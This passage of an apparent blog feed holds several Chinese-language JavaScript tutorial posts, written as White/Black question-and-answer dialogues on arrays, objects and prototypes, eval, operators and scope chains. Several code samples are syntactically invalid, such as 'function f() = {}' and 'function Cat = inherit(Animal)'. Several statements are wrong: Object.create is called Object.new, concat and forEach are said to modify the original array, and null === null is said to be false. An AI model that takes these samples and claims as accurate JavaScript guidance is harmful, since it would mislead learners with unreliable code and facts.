&lt;li&gt;只提供构造函数，其他方法通过参数调用方法。&lt;/li&gt;

&lt;li&gt;支持链式调用，也支持对象显示功能，防止火车事故的难以跟踪。&lt;/li&gt;

&lt;li&gt;最好支持extend和include等方式对类库进行扩展。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js数组篇(八)</title>
   <link href="http://izhanghuaning.github.io/2011/06/05/jsdg-chap7-array.html"/>
   <updated>2011-06-05T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/06/05/jsdg-chap7-array</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:js中数组是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;数组是值的有序集合，每个值在数组中都有一个位置，以从0开始的数字表示，称为索引。js中的数组就是一个特殊的对象，这个对象的属性名恰好是数字，并且它有一个可以自己维护值的属性length。&lt;/p&gt;

&lt;p&gt;在js中数组是一个非常重要的概念，js中的集合就是通过数组来实现的，提供了很多集合的操作方法。绝大多数数组方法都支持回调函数，这也就是高阶函数的概念。&lt;/p&gt;

&lt;p&gt;js中数组有如下特征：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;当有新的元素添加到列表中时，自动更新length属性&lt;/li&gt;

&lt;li&gt;设置length为一个较小的值将截断数组&lt;/li&gt;

&lt;li&gt;从Array.prototype继承了一些方法&lt;/li&gt;

&lt;li&gt;其类属性(class)为“Array”&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:js中数组有哪些方法？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;ECMAScript3中的方法主要有；&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;join(splitor)将数组中所有元素都转化为字符串并连接在一起，并用分割符进行隔离，默认分割符是逗号(,)。&lt;/li&gt;

&lt;li&gt;reverse()将数组中元素的顺序逆序排列，并返回逆序的数组，修改原数组。&lt;/li&gt;

&lt;li&gt;sort(callback)将数组中元素通过callback排序后返回排序后的数组，修改原数组。&lt;/li&gt;

&lt;li&gt;concat(elements)把elements连接到原数组后面，如果elements中有数组则一次扁平化后连接其元素。修改原数组。&lt;/li&gt;

&lt;li&gt;slice()返回数组的一个片段或字数组，原数组不变。其参数是”顾头不顾尾”，包含起始点元素，不包含结束点元素。&lt;/li&gt;

&lt;li&gt;splice()在数组中插入或删除元素，修改原数组。&lt;/li&gt;

&lt;li&gt;push()、pop()将数组当作栈使用。修改原数组。&lt;/li&gt;

&lt;li&gt;unshift()、shift()类似栈，但是是对头进行操作。修改原数组。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ECMAScript5增加了新方法如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;forEach(callback)遍历数组并为每个元素调用callback，返回修改后的数组。修改原数组。&lt;/li&gt;

&lt;li&gt;map(callback)遍历数组并为每个元素调用callback，返回新数组。&lt;/li&gt;

&lt;li&gt;filter(callback)返回满足callback的原数组的一个子集的新数组。&lt;/li&gt;

&lt;li&gt;every(callback)、some(callback)数组的逻辑判定，是否满足callback，返回true或false。&lt;/li&gt;

&lt;li&gt;reduce(callback,start)使用callback对数组进行组合，返回一个单个值。&lt;/li&gt;

&lt;li&gt;indexOf(el)搜索数组给出el元素的索引值。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;数组还可以定义很多方法，这些需要自己去实现。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white&quot;&gt;White:什么是类数组对象？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;是一个对象，却具有数组的特征，可以通过Array.prototype.slice.call(o,0,o.length-1)转化为真正的数组。数组的很多方法都可以直接使用于类数组对象。最常见的就是Arguments对象。&lt;/p&gt;

&lt;p&gt;Arguments是每个函数体中都有的参数对象，代表了实际传入函数的参数，将在下一篇函数篇进行详细介绍。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js对象篇(七)</title>
   <link href="http://izhanghuaning.github.io/2011/05/30/jsdg-chap6-object.html"/>
   <updated>2011-05-30T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/30/jsdg-chap6-object</id>
   <content type="html">&lt;h4 id=&quot;whitejsjs&quot;&gt;White:js中什么是js对象？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;在js中类型分为原始类型和对象类型，除了原始类型string、number、bool、null、undefined外的其他所有类型都属于对象类型。对象最基本的形式是“名/值”对的无序集合。如&lt;code&gt;var o = {x:1,y:2}&lt;/code&gt;，其中x、y为对象o的属性，其值可以为任何类型。访问对象的值可以通过点(.)形式，也可以通过数组索引（&lt;code&gt;o[&amp;quot;x&amp;quot;]&lt;/code&gt;）的形式，一般采用前者，但是后者可以实现很多动态强大功能。&lt;/p&gt;

&lt;p&gt;对象包括内置对象(ECMASCript原生对象）、宿主对象（浏览器定义的）、自定义对象（程序员定义的）。&lt;/p&gt;

&lt;p&gt;对象属性不仅是字符串，属性(property)本身也有自己的属性(attribute)，对象不仅可以访问自己的属性，也可以访问其继承的属性，这种继承是通过js的“原型链”的核心功能实现的。&lt;/p&gt;

&lt;p&gt;对象是可变的，我们通过引用而非值来操作对象。对象最常见的用法是创建、设置、查找、删除、检测和枚举它的属性。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs&quot;&gt;White:js中创建对象有哪些方式？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中创建对象有三种方式：对象直接量、new、Object.create()；&lt;/p&gt;

&lt;p&gt;对象直接量就是直接通过花括号进行初始化对象，如下所示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var empty = {};
	var point = {x:1, y:1};
	var book = {
		&amp;quot;title&amp;quot;:&amp;quot;Javascript&amp;quot;,
		&amp;quot;for&amp;quot;:&amp;quot;all audiences&amp;quot;,
		&amp;quot;author&amp;quot;:{
			firstname:&amp;quot;huaning&amp;quot;,
			lastname:&amp;quot;zhang&amp;quot;
		}
	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;new方式请参见&lt;a href=&quot;/2011/05/20/jsdg-chap4-expression-operators.html&quot;&gt;对象创建表达式和new关键字&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;Object.new(proto，options)方式是ECMAScript5新定义的，它是Object的一个静态方法，其中第一个参数表示以proto作为所创建的对象的原型(__proto__)，第二个参数是一个对象，用来初始化所创建的对象的属性。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var nullobject = Object.create(null);//这个对象不包含任何方法，是真正的空对象,同null类似。
	var emptyobject = Object.create(Object.prototype);//这个对象是普通空对象，其原型是Object.prototype
	//ECMAScript5的Object.crate方法模拟
	function inherit(p) {
		if(p == null) throw TypeError();
		if(Object.create) return Object.create(p);
		var t = typeof p;
		if(t !== &amp;quot;object&amp;quot; &amp;amp;&amp;amp; t!== &amp;quot;function&amp;quot;) throw TypeError;
		function f() = {};
		f.prototype = p;
		return new f();
	}
	//new f()作为临时对象，是为了函数作为返回值时，隔离不同的新创建对象和原型p的关联关系。
	
	//举例说明：
	function Animal() {name=&amp;quot;p&amp;quot;};
	function Cat = inherit(Animal);
	Cat.prototype.say = function(){return &amp;quot;miao&amp;quot;;}
	function Dog = Inherit(Animal);
	Dog.prototype.say = function() {return &amp;quot;wang&amp;quot;;}
	
	//如果不使用临时对象，则Dog和Cat会相互影响，可以自己尝试。&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejspropertyattribute&quot;&gt;White:js中对象的属性(property)本身有哪些特性(attribute)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;属性的特性包括名、值、可枚举性、可配置性。&lt;/p&gt;

&lt;p&gt;Object.getOwnPropertyDescriptor()可以获得某个对象的属性描述符。&lt;/p&gt;

&lt;p&gt;Object.defineProperty()传入要修改的对象、要修改的属性及属性描述符对象，即可修改某种属性。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsattribute&quot;&gt;White:js中对象有哪些属性(attribute)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;对象的属性有原型属性(__proto__）、类属性(class)、可扩展性。&lt;/p&gt;

&lt;p&gt;原型属性在下面详细讲解。&lt;/p&gt;

&lt;p&gt;类属性是一个字符串，用来表示对象的类型信息，通过Object.prototype.toString.call(o)方式取得&lt;code&gt;[xxx class]&lt;/code&gt;形式字符串。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	//下面函数可以取得对象类型
	function classof(o) {
		if(o === null) return &amp;quot;Null&amp;quot;;
		if(o === undefined) return &amp;quot;Underfined&amp;quot;;
		return Object.prototype.toString.call(o).slice(8, -1);
	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可扩展性配合属性的特性可以实现只读对象等特殊对象,用的少，现用现查不具体讲解。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs__proto__&quot;&gt;White:js中对象原型(__proto__)是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js是一种面向对象的语言，面向对象的特征有封装、继承、多态。js完全可以写出像java那样的Class式的程序，它是通过&lt;code&gt;function ClassName（）&lt;/code&gt;这样的方式来实现Class的。有了Class可以把数据和方法封装起来，而且对于弱类型的js来说多态更是容易实现，最显而易见就是”鸭式辩型”的方式。剩下的继承在js中就是通过原型来实现的，大多数语言的继承是通过模板即Class方式实现，但js是通过原型来实现的。 下面是示例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	function Animal() { name=&amp;quot;animal&amp;quot;; };
	var animal = new Animal();
	animal.name;//=&amp;gt;animal
	animal.say();//错误，未定义say
	Animal.prototype.say = function(){return &amp;quot;I am &amp;quot;+ this.name;}
	animal.say();//=&amp;gt;I am animal;
	animal.__proto__ === Animal.prototype;//=&amp;gt;true
	Animal.__proto__ === Function.prototype;//=&amp;gt;true&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs__proto__prototype&quot;&gt;White:js中对象原型(__proto__)和prototype有什么区别？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	1. 所有对象都有__proto__，但不是每个对象都有prototype。
	2. prototype是函数(function)特有的。
	3. 函数也是对象，它既有__proto__(Function.prototype)，也有prototype(new f().__proto__);
	4. Function的__proto__和prototype是同一个。
	5. Object.prototype.__proto__ 是null。
	6. Object.prototype是所有对象的最终__proto__。
	7. Object是一个函数，Object.prototype是一个对象。
	8. Object.prototype必须是一个对象，而不能是函数。&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsjson&quot;&gt;White:js对象序列化json对象方法有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; json序列化方法有JSON.stringify(o)和JSON.parse(s)来进行序列化和反序列化。json只支持对象、数组、字符串、数字、true、false、null，不支持日期、函数、Regxp、Error等的序列化。json字符串中日期建议以字符串或者timestamp形式。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js表达式篇eval(六)</title>
   <link href="http://izhanghuaning.github.io/2011/05/25/jsdg-chap4-expression-operators2.html"/>
   <updated>2011-05-25T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/25/jsdg-chap4-expression-operators2</id>
   <content type="html">&lt;h4 id=&quot;white&quot;&gt;White:表达式计算是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js同许多解释性语言一样，可以解释并运行由js代码组成的字符串，并产生一个值。这就是表达式运算，在js中通过全局函数eval()来实现这个工作。对于eval记住一句话：”eval()是魔鬼”，能不用就不要用。&lt;/p&gt;

&lt;p&gt;eval只有一个参数，如果传入的参数不是字符串，它直接返回这个参数，否则它会把参数字符串当作js代码来解释，如果解释失败则抛出错误，成功则开始执行。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whiteeval&quot;&gt;White:eval有哪些需注意的地方？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;记住一句话：”eval()是魔鬼”，能不用就不要用。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;在你觉得需要使用eval方法的时候，请再三考虑一下是否有更好的方式来替代eval。&lt;/li&gt;

&lt;li&gt;eval只能执行单独有语义的代码，不能作为函数的一部分来运行，比如&lt;code&gt;eval(&amp;quot;return;&amp;quot;)//=&amp;gt;错误&lt;/code&gt;。&lt;/li&gt;

&lt;li&gt;非直接调用eval(使用&lt;code&gt;geval = eval;&lt;/code&gt;别名)时，它使用全局对象作为上下文作用域，并且无法读、写、定义局部变量和函数。&lt;/li&gt;

&lt;li&gt;eval别名调用方式允许我们执行一些对上下文没有任何依赖的代码片段。&lt;/li&gt;

&lt;li&gt;对待eval最好把它当作一个运算符，而不是一个函数。&lt;/li&gt;

&lt;li&gt;在严格模式下，eval可以查询和修改局部变量，但是不能在局部作用域定义新的变量或函数。&lt;/li&gt;

&lt;li&gt;ajax返回的json送入eval进行处理时需要对json加括号包住&lt;code&gt;eval(&amp;quot;(&amp;quot;+json+&amp;quot;)&amp;quot;)&lt;/code&gt;来转成对象处理,但是json处理一般是用JSON.parse进行解析。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whiteeval_2&quot;&gt;White:为什么说”eval是魔鬼”？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;主要有以下几个原因:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用eval的代码晦涩难懂，不容易维护。&lt;/li&gt;

&lt;li&gt;eval包含安全隐患，它可以执行可能被篡改过的代码，这是在处理ajax请求的json响应的常见的反模式。&lt;/li&gt;

&lt;li&gt;eval使用了调用者的变量作用域环境，即它查找变量的值和定义新变量的操作和局部作用域的代码完全一样，会改变调用者（局部或全局）的变量对象VO。&lt;/li&gt;

&lt;li&gt;优化或者js压缩工具不能很好的对包含eval的代码进行优化。&lt;/li&gt;

&lt;li&gt;setInterval()、setTimeout()、new Function()这些方法传递字符串参数的时候和eval类似，应尽量避免传递字符串给它们。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whiteeval_3&quot;&gt;White:使用哪些方式可以尽量安全eval的方式？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;有一些方式可以替换或者较好方式使用eval，主要有以下几种：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;使用new Function(str)来替代eval，str中使用var定义的变量会在局部函数作用域运行，不会自动成为全局变量。&lt;/li&gt;

&lt;li&gt;使用立即函数封装eval的调用，也可避免其中var定义的变量自动成为全局变量。&lt;/li&gt;

&lt;li&gt;使用new Function的方式只能看到全局作用域，不影响局部作用域链。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js表达式、运算符篇(五)</title>
   <link href="http://izhanghuaning.github.io/2011/05/20/jsdg-chap4-expression-operators.html"/>
   <updated>2011-05-20T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/20/jsdg-chap4-expression-operators</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:js中什么是表达式和运算符？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;在js中表达式（expression）是一个短语，js解释器会将其计算出一个结果。程序中的常量是最简单的一类表达式。变量名也是一种简单表达式，它的值就是赋值给变量的值。复杂表达式是由简单表达式组成的，常用的方法是使用运算符(operator)。运算符按照特定的运算规则对操作数进行运算，并计算出新值。&lt;/p&gt;

&lt;p&gt;表达式主要包含原始表达式(直接量(常量)、关键字(true,false，null,this)、变量），对象和数组初始化表达式（&lt;code&gt;var p = {x:2, y:3}&lt;/code&gt;、&lt;code&gt;var days = [1,2,3]&lt;/code&gt;） ，函数定义表达式（&lt;code&gt;var sum = function(a,b) {return a + b}&lt;/code&gt;)，属性访问表达式(&lt;code&gt;p.x&lt;/code&gt;、&lt;code&gt;p[&amp;quot;y&amp;quot;]&lt;/code&gt;、&lt;code&gt;days[0]&lt;/code&gt;），调用表达式（调用函数或方法的语法表示），对象创建表达式(new)，运算表达式（见下面运算符所示）等。&lt;/p&gt;

&lt;p&gt;js中的运算符主要用于算术表达式(+、-、*、/)、比较表达式(&amp;lt;、===、&amp;gt;）、逻辑表达式（&amp;amp;&amp;amp;、||、！）、赋值表达式（=）等。大多数运算符都用标点符号表示，比如+-*/，也有一些运算符用关键字表示，比如delete、instanceof、typeof、void等。运算符是有优先级和结合性(一元操作符、赋值、三元条件运算符都是右结合)的，关于运算符可参见下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/operator1.png&quot; alt=&quot;&quot; title=&quot;运算符汇总1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/operator2.png&quot; alt=&quot;&quot; title=&quot;运算符汇总2&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white&quot;&gt;White:什么是左值,什么是表达式副作用？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;左值是一个术语，它指“表达式只能出现在运算符的左侧”。在js中变量、对象属性、数组元素均是左值。ECMAScript规范允许内置函数返回左值，但是自定义函数不能返回左值。&lt;/p&gt;

&lt;p&gt;表达式副作用是指本来计算表达式（比如&lt;code&gt;2*3&lt;/code&gt;)不会对程序的运行状态造成任何影响，程序后续的计算也不会受到该表达式运算的影响，但是有一些表达式在即算后会产生上述影响，这就是表达式的副作用。&lt;/p&gt;

&lt;p&gt;会产生副作用的表达式有：赋值、自增、函数调用、对象创建、delete等。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_2&quot;&gt;White:调用表达式怎么理解？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;调用表达式(invocation expression）是一种调用（或者执行）函数或方法的语法表示。当调用表达式进行求值的时候，首先计算函数表达式，然后计算参数表达式，得到一组参数。然后实参的值被依次传递给形参，这些形参是定义函数时指定的，接下来执行函数体。执行后返回该函数的返回值，如果没有则返回undefined。&lt;/p&gt;

&lt;p&gt;在js中函数调用有两种方式普通调用和new调用，这两种方式调用同一个函数，其意义确实差异巨大。普通方式是通过func.apply方式来对函数过程进行调用，而new方式是对象创建表达式，详细见下面的new关键字的理解。&lt;/p&gt;

&lt;p&gt;函数表达式本身可以说没有副作用，但是因为函数体内部的语句或者表达式可能会产生副作用，所以这种情况下一般说函数表达式是有副作用的。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitenew&quot;&gt;White:对象创建表达式和new关键字怎么理解？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;对象创建表达式(object creation expression)创建一个对象并调用一个函数(这个函数称作构造函数)初始化对象的属性。js通过new关键字来进行对象创建，new关键字调用的函数与普通调用方式有2点不同：改变了上下文和改变了返回值。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;new的本质&lt;/em&gt;&lt;/strong&gt;，new关键字本质上也是调用函数的方式（普通函数调用是通过func.apply或func.call方式调用），它的特殊性在于把函数当作构造函数来执行，并最终创建一个对象。其过程如下：js解释器new关键字时知道是创建对象的时候了，进行了如下步骤：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;首先传见一个新的空对象（{}）。&lt;/li&gt;

&lt;li&gt;然后把这个对象赋值给this（自定义函数无法给this赋值）。&lt;/li&gt;

&lt;li&gt;构造函数的prototype作为新对象的原型(__proto___)。&lt;/li&gt;

&lt;li&gt;把构造函数作为新对象的原型(__proto__)的constructor。&lt;/li&gt;

&lt;li&gt;调用构造函数把传入的参数和构造函数中赋值给this的属性都作为新对象的属性&lt;/li&gt;

&lt;li&gt;如果构造函数没有return则把这个构造好新对象作为返回值。&lt;/li&gt;

&lt;li&gt;如果有return则把其返回的对象作为最后的返回值，即创建表达式计算的值。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_3&quot;&gt;White:比较运算符中的==和===的区别是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;简单来说==会进行类型转换后比较，而===不进行类型转换直接比较，===也是严格比较,应该只使用===。&lt;/p&gt;

&lt;p&gt;===规则为：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;如果两个值类型不同，则它们不相等。&lt;/li&gt;

&lt;li&gt;如果两个值都是null或者undefined，则它们不相等。&lt;/li&gt;

&lt;li&gt;如果两个值都是true或者都是false，则相等。&lt;/li&gt;

&lt;li&gt;任何一个是NaN则不相等，NaN需要使用!==来判断。&lt;/li&gt;

&lt;li&gt;如果两个值为数字且数值相等，则相等。0和-0相等。&lt;/li&gt;

&lt;li&gt;两个字符串只有它们所对应存储的16位数字完全相等，则它们相等。（字符串实际上是16位整数数值组成的序列，同一字符串但编码不同就是2个不同的整数序列，所以不相等。）&lt;/li&gt;

&lt;li&gt;如果两个引用值指向同一个对象、数组或者函数，则相等，只比较引用不考虑具体的值的情况。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;==规则就是===规则然后每一个都允许进行类型转换后尝试比较，比如&lt;code&gt;null==undefined //=&amp;gt;true&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;对象转换原始值是除了日期先进行toString，其他都是先valueof后调用toString进行转换。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_4&quot;&gt;White:对象转换为原始值有哪些规则？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;所有对象都继承了2个转换方法，第一个是toString（），它的作用是返回一个反映对象的字符串，默认是&lt;code&gt;[object Object]&lt;/code&gt;,我们可以通过Object.prototype.toString.call(o)来得到o的实际类型，比如&lt;code&gt;[object String]&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;第二个是valueof()，如果存在任意原始值，它就默认将对象转换未它的原始值。但是大多数对象无法真正表示为一个原始值，因此默认的valueof简单返回对象本身，而不是一个原始值。&lt;/p&gt;

&lt;p&gt;对象到字符串的转换步骤（先toString后valueof）：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	if(o.has_method(toString) &amp;amp;&amp;amp; o.toString()===&amp;quot;原始值&amp;quot;)
	{
		return o.toString().转成字符串;
	} else if(o.has_method(valueof) &amp;amp;&amp;amp; o.valueof() === &amp;quot;原始值&amp;quot;)
	{
		return o.valueof().转成字符串；
	} else
	{
		throw 异常；
	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对象到数字的转换步骤（先valueof后toString）：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	if(o.has_method(valueof) &amp;amp;&amp;amp; o.valueof() === &amp;quot;原始值&amp;quot;)
	{
		return o.valueof().转成数字；
	} else if(o.has_method(toString) &amp;amp;&amp;amp; o.toString()===&amp;quot;原始值&amp;quot;)
	{
		return o.toString().数字;
	} else
	{
		throw 异常；
	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对象转换原始值是除了日期先进行toString，其他都是先valueof后调用toString进行转换。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js变量篇作用域链(四)</title>
   <link href="http://izhanghuaning.github.io/2011/05/15/jsdg-chap3-types-values-variables3.html"/>
   <updated>2011-05-15T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/05/15/jsdg-chap3-types-values-variables3</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;本篇定位于进阶篇，初次接触javascript的可跳过本篇&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;whitejsstackheap&quot;&gt;White:什么是上下文调用栈，js中的栈(stack)和堆(heap)的理解？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;正如前一篇模拟js解释器所示，js代码初始所在的作用域为顶级作用域。js只有一种作用域即函数作用域，每当代码执行到一个函数的时候，暂停执行外层作用域,并保留当前代码的上下文和执行位置，然后进入一个新的作用域，产生一个新的上下文，如此反复就构成了一个上下文栈式结构，每一层都是一个作用域范围即一个上下文，进入新的作用域类似于入栈push一个新上下文，从内层作用域返回类似于出栈pop出当前上下文，所以叫做上下文调用栈。当代码在内层作用域执行完以后返回外部作用域的代码位置，丢掉内层的上下文(闭包情况例外)，使用外层上下文继续向下进行,所有函数执行完返回顶级作用域，这时候window对象作为当前上下文对象（变量对象VO），当前包含上下文的对象即活动对象。&lt;/p&gt;

&lt;p&gt;说到堆栈，很多人当希望深入了解某些代码的执行过程（比如java、c#、javascript等），喜欢模拟内存中数据进行分析，这是一个很好的方法,对于理解程序很有帮助。在java中原始值是通过栈来维护的，而引用值是通过堆来管理的，这主要是考虑程序的效率，栈速度快但容量小，堆容量大但相对慢，堆里面的对象是通过new的方式来分配空间并创建的，也涉及到垃圾回收的管理。&lt;/p&gt;

&lt;p&gt;但是在javascript对我们可以说只有堆，没有栈结构，因为有变量对象VO的概念，所以所有的数据都是以堆的形式管理的，解释器不直接取数据，都是通过变量对象VO取数据，这是很重要的一点，尤其是想要理解闭包的概念。javascript的内存中数据结构很简单VO作为上下文，通过链表的形式链接所有的VO，链接起来就是上下文调用栈，这里的栈只是一个描述性概念，不是内存管理数据的方式，所以&lt;strong&gt;&lt;em&gt;“正式的称呼叫作用域链”&lt;/em&gt;&lt;/strong&gt;，凸显了链这个结构。&lt;/p&gt;

&lt;p&gt;下面会继续讲解VO概念。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitevariable_objectactive_object&quot;&gt;White:什么是变量对象（variable object）和活动对象(active object)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;如前所述，声明全局变量，它会成为一个全局对象window的一个属性，那么局部变量呢，按照统一性进行推论应该成为某个对象的属性。这个对象即是假设的上下文对象VO。当代码执行的时候，会形成一个作用域链，在每个作用域有一个由很多变量、参数、函数等组成的上下文，包含上下文中的内容的对象被成为变量对象VO，解释器正在执行的作用域的VO就是活动对象AO。&lt;/p&gt;

&lt;p&gt;VO对象对我们是透明（不可见）的，它由解释器来创建和维护的，我们代码不能操作VO。但是我们可以通过chrome等的开发者工具可以查看到scope variables即作用域链，里面有各个VO。我假设的VO对象结构是下面这个样子：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var VO = {
		var1:&amp;quot;var1&amp;quot;,
		function1:function() {},
		arg1:arg1,
		.//变量、函数、参数都编程了VO对象的属性
		.//还有个作用域链的属性和this属性
		.//注意：表达式不能成为VO的属性
		ScopeChains:[VO的上面的属性 + 上级ScopeChains],
		this:特殊值//=》函数的调用者被关联到this。

	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ScopeChains和this两个属性不进入作用域链查找，查找时先看当前VO有没有相应属性，没有则进入上一级的ScopeChains查找。this是javascript的最核心内容（也可能是之一），后面应该也要单独讲解,请参见&lt;a href=&quot;/jsdg/2011/06/20/jsdg-chap8-this.html&quot;&gt;javascript this详解&lt;/a&gt;。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitevo__proto__objectprototype&quot;&gt;White:VO既然是个对象，那么它的原型(__proto__)是什么？对象Object.prototype？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;我有个假设是函数级VO的原型是null，因为我在chrome的开发者工具做了如下测试：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	function test() { return toString() }
	test();//=&amp;gt;[object window]
	window.toString = function() {return &amp;quot;window toString&amp;quot;}
	test();//=&amp;gt;window toString&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;测试中的toString()方法在test的作用域没有定义，但是Object中有这个方法，它的返回值就是[object xxxx]的形式，所以第一次调用的就是Object的toString方法。这个调用是调用的VO的原型的toString方法还是通过window调用的呢？所以把window的toString重写，然后再次调用，发现是调用的window的toString方法。根据作用域链，解释器应该先从test的VO寻找toString方法，既然是从VO对象中查找属性则涉及到原型链查找，如果VO的原型链有Object，应该会直接调用Object的toSring方法。但是后面证实解释器是从test的VO，找到window的VO,然后调用的window的toString方法，所以我假设VO的原型(__proto__)是null，所以VO直接沿着作用域链的VO查找所有参数、变量和函数，而不会去原型链查找。&lt;/p&gt;

&lt;p&gt;但是到了window的VO呢？似乎不能满足上面假说，因为调用了window的toString方法，这个方法是从其原型链的Object得到的，这里是有冲突的，所以我的另一个假说是window的VO引用了window自身，从chrome也可以看到这个意思(Global window)。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;这里的假说有待商榷，希望有了解的能够指正，我没有去研究js引擎的内容，谢谢&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white&quot;&gt;White:作用域链是如何形成的呢？&lt;/h4&gt;

